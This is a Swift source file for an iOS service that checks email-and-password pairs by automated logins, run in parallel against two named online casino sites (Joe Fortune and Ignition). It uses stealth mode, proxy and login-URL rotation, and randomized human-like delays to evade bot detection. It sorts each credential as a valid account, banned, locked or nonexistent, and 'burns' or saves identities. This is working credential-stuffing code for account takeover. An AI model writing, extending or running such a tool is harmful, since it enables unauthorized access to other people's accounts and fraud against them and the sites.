import Foundation
import UIKit
import WebKit

@MainActor
class DualSiteWorkerService {
    static let shared = DualSiteWorkerService()

    private let logger = DebugLogger.shared
    private let networkFactory = NetworkSessionFactory.shared
    private let notifications = PPSRNotificationService.shared
    private let blacklistService = BlacklistService.shared
    private let urlRotation = LoginURLRotationService.shared
    private let crashProtection = CrashProtectionService.shared

    struct WorkerResult {
        let session: DualSiteSession
        let joeOutcome: LoginOutcome?
        let ignitionOutcome: LoginOutcome?
    }

    func runDualSiteSession(
        session: inout DualSiteSession,
        config: UnifiedSystemConfig,
        stealthEnabled: Bool,
        onUpdate: @escaping (DualSiteSession) -> Void,
        onLog: @escaping (String, PPSRLogEntry.Level) -> Void
    ) async -> WorkerResult {
        let sessionId = "unified_\(session.credential.email.prefix(10))_\(UUID().uuidString.prefix(6))"
        onLog("Worker \(sessionId): starting dual-site test for \(session.credential.email)", .info)

        session.currentAttempt = 0
        onUpdate(session)

        let joeEngine = LoginAutomationEngine()
        let ignEngine = LoginAutomationEngine()

        configureEngine(joeEngine, target: .joe, stealthEnabled: stealthEnabled)
        configureEngine(ignEngine, target: .ignition, stealthEnabled: stealthEnabled)

        var joeScreenshots: [PPSRDebugScreenshot] = []
        var ignScreenshots: [PPSRDebugScreenshot] = []

        joeEngine.onScreenshot = { screenshot in joeScreenshots.append(screenshot) }
        ignEngine.onScreenshot = { screenshot in ignScreenshots.append(screenshot) }
        joeEngine.onLog = { msg, level in onLog("[JOE] \(msg)", level) }
        ignEngine.onLog = { msg, level in onLog("[IGN] \(msg)", level) }

        let credential = LoginCredential(username: session.credential.email, password: session.credential.password)
        var lastJoeOutcome: LoginOutcome?
        var lastIgnOutcome: LoginOutcome?

        for attemptNum in 1...config.maxAttemptsPerSite {
            guard session.globalState == .active else { break }

            session.currentAttempt = attemptNum
            onUpdate(session)
            onLog("Worker \(sessionId): attempt \(attemptNum)/\(config.maxAttemptsPerSite)", .info)

            let humanDelay = Double.random(in: 0.4...0.7)
            if attemptNum > 1 {
                let thinkDelay = Double.random(in: 2.5...4.0)
                onLog("Worker \(sessionId): inter-attempt think delay \(String(format: "%.1f", thinkDelay))s", .info)
                try? await Task.sleep(for: .seconds(thinkDelay))
            } else {
                try? await Task.sleep(for: .seconds(humanDelay))
            }

            guard session.globalState == .active else { break }

            let joeAttempt = LoginAttempt(credential: credential, sessionIndex: attemptNum)
            let ignAttempt = LoginAttempt(credential: credential, sessionIndex: attemptNum)

            let joeURL = resolveURL(for: .joefortune)
            let ignURL = resolveURL(for: .ignition)

            let timeout: TimeInterval = 90

            let (joeOutcome, ignOutcome) = await runParallelAttempts(
                joeEngine: joeEngine,
                ignEngine: ignEngine,
                joeAttempt: joeAttempt,
                ignAttempt: ignAttempt,
                joeURL: joeURL,
                ignURL: ignURL,
                timeout: timeout
            )

            lastJoeOutcome = joeOutcome
            lastIgnOutcome = ignOutcome

            let now = Date()
            let joeDuration = joeAttempt.startedAt.map { Int(now.timeIntervalSince($0) * 1000) } ?? 0
            let ignDuration = ignAttempt.startedAt.map { Int(now.timeIntervalSince($0) * 1000) } ?? 0

            session.joeAttempts.append(SiteAttemptResult(
                siteId: "joe",
                attemptNumber: attemptNum,
                responseText: joeAttempt.responseSnippet ?? describeOutcome(joeOutcome),
                timestamp: now,
                durationMs: joeDuration
            ))

            session.ignitionAttempts.append(SiteAttemptResult(
                siteId: "ignition",
                attemptNumber: attemptNum,
                responseText: ignAttempt.responseSnippet ?? describeOutcome(ignOutcome),
                timestamp: now,
                durationMs: ignDuration
            ))

            let classification = classifyOutcomes(joe: joeOutcome, ignition: ignOutcome, attemptNum: attemptNum, maxAttempts: config.maxAttemptsPerSite)

            switch classification {
            case .success:
                session.globalState = .success
                session.classification = .validAccount
                session.identityAction = .burn
                session.endTime = Date()
                onLog("Worker \(sessionId): SUCCESS — credential valid", .success)
                notifications.sendBatchComplete(working: 1, dead: 0, requeued: 0)

            case .permBan:
                session.globalState = .abortPerm
                session.classification = .permanentBan
                session.identityAction = .burn
                session.endTime = Date()
                onLog("Worker \(sessionId): PERM BAN — early stop, identity burned", .error)
                blacklistService.addToBlacklist(session.credential.email, reason: "Auto: perm disabled via unified test")

            case .tempLock:
                session.globalState = .abortTemp
                session.classification = .temporaryLock
                session.identityAction = .save
                session.endTime = Date()
                onLog("Worker \(sessionId): TEMP LOCK — account exists, identity saved", .warning)

            case .continueLoop:
                onLog("Worker \(sessionId): incorrect password on attempt \(attemptNum) — continuing", .info)

            case .exhausted:
                session.globalState = .exhausted
                session.classification = .noAccount
                session.identityAction = .save
                session.endTime = Date()
                onLog("Worker \(sessionId): EXHAUSTED — 4x incorrect, no account", .error)

            case .uncertain:
                if attemptNum >= config.maxAttemptsPerSite {
                    session.globalState = .exhausted
                    session.classification = .noAccount
                    session.identityAction = .save
                    session.endTime = Date()
                    onLog("Worker \(sessionId): UNCERTAIN after max attempts — marking no account", .warning)
                } else {
                    onLog("Worker \(sessionId): uncertain result on attempt \(attemptNum) — retrying", .warning)
                }
            }

            onUpdate(session)

            if session.globalState != .active { break }
        }

        if session.globalState == .active {
            session.globalState = .exhausted
            session.classification = .noAccount
            session.identityAction = .save
            session.endTime = Date()
            onUpdate(session)
        }

        return WorkerResult(session: session, joeOutcome: lastJoeOutcome, ignitionOutcome: lastIgnOutcome)
    }

    private func runParallelAttempts(
        joeEngine: LoginAutomationEngine,
        ignEngine: LoginAutomationEngine,
        joeAttempt: LoginAttempt,
        ignAttempt: LoginAttempt,
        joeURL: URL,
        ignURL: URL,
        timeout: TimeInterval
    ) async -> (LoginOutcome, LoginOutcome) {
        async let joeResult = joeEngine.runLoginTest(joeAttempt, targetURL: joeURL, timeout: timeout)
        async let ignResult = ignEngine.runLoginTest(ignAttempt, targetURL: ignURL, timeout: timeout)

        let joe = await joeResult
        let ign = await ignResult

        return (joe, ign)
    }

    private nonisolated enum AttemptClassification: Sendable {
        case success
        case permBan
        case tempLock
        case continueLoop
        case exhausted
        case uncertain
    }

    private func classifyOutcomes(joe: LoginOutcome, ignition: LoginOutcome, attemptNum: Int, maxAttempts: Int) -> AttemptClassification {
        if joe == .success || ignition == .success {
            return .success
        }

        if joe == .permDisabled || ignition == .permDisabled {
            return .permBan
        }

        if joe == .tempDisabled || ignition == .tempDisabled {
            return .tempLock
        }

        if joe == .noAcc && ignition == .noAcc {
            if attemptNum >= maxAttempts {
                return .exhausted
            }
            return .continueLoop
        }

        if joe == .noAcc || ignition == .noAcc {
            if attemptNum >= maxAttempts {
                return .exhausted
            }
            return .continueLoop
        }

        if attemptNum >= maxAttempts {
            return .exhausted
        }

        return .uncertain
    }

    private func configureEngine(_ engine: LoginAutomationEngine, target: ProxyRotationService.ProxyTarget, stealthEnabled: Bool) {
        engine.debugMode = false
        engine.stealthEnabled = stealthEnabled
        engine.proxyTarget = target
    }

    private func resolveURL(for site: LoginTargetSite) -> URL {
        let wasIgnition = urlRotation.isIgnitionMode
        urlRotation.isIgnitionMode = (site == .ignition)
        let url = urlRotation.nextURL() ?? site.url
        urlRotation.isIgnitionMode = wasIgnition
        return url
    }

    private func describeOutcome(_ outcome: LoginOutcome) -> String {
        switch outcome {
        case .success: "Login successful"
        case .permDisabled: "Account permanently disabled"
        case .tempDisabled: "Account temporarily disabled"
        case .noAcc: "Incorrect password"
        case .unsure: "Uncertain result"
        case .connectionFailure: "Connection failure"
        case .timeout: "Timed out"
        case .redBannerError: "Red banner error"
        case .smsDetected: "SMS notification detected"
        }
    }
}
